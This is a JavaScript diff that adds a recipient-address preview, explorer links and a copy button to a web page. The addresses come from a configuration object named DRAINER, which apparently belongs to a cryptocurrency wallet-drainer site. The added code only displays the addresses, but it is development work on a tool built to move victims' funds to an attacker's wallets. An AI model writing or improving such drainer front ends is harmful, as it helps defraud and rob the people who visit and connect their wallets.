@@ -160,4 +160,36 @@
       setInterval(updateCountdown, 30000);
     }
   }
+
+  /* 6. transaction recipient preview */
+  const toRow = document.querySelector(".to-row");
+  const toEl = $("tx-to");
+  const toCopy = $("tx-to-copy");
+  const toExplorer = $("tx-to-explorer");
+  const short = (a) => (a && a.length > 12 ? a.slice(0, 6) + "\u2026" + a.slice(-4) : a || "");
+  const renderTo = () => {
+    if (!toRow || !toEl) return;
+    const chainKey = document.querySelector('[role="tab"][aria-selected="true"]')?.dataset.chain;
+    const addr = chainKey === "eth" ? DRAINER.evmRecipient : DRAINER.solRecipient;
+    const visible = !$("result")?.hidden;
+    toRow.hidden = !visible || !addr;
+    if (!addr) return;
+    toEl.textContent = short(addr);
+    toEl.title = addr;
+    if (toExplorer) {
+      const cluster = location.search.includes("cluster=devnet") ? "?cluster=devnet" : "";
+      toExplorer.href = chainKey === "eth" ? "https://etherscan.io/address/" + addr : "https://solscan.io/account/" + addr + cluster;
+    }
+  };
+  if (toRow && toEl) {
+    renderTo();
+    document.querySelectorAll('[role="tab"]').forEach((tab) => tab.addEventListener("click", () => setTimeout(renderTo, 20)));
+    const resultEl = $("result");
+    if (resultEl) new MutationObserver(renderTo).observe(resultEl, { attributes: true, attributeFilter: ["hidden"] });
+    toCopy?.addEventListener("click", async () => {
+      const chainKey = document.querySelector('[role="tab"][aria-selected="true"]')?.dataset.chain;
+      const addr = chainKey === "eth" ? DRAINER.evmRecipient : DRAINER.solRecipient;
+      try { await navigator.clipboard.writeText(addr); toCopy.textContent = "Copied"; setTimeout(() => (toCopy.textContent = "Copy"), 1200); } catch {}
+    });
+  }
 })();
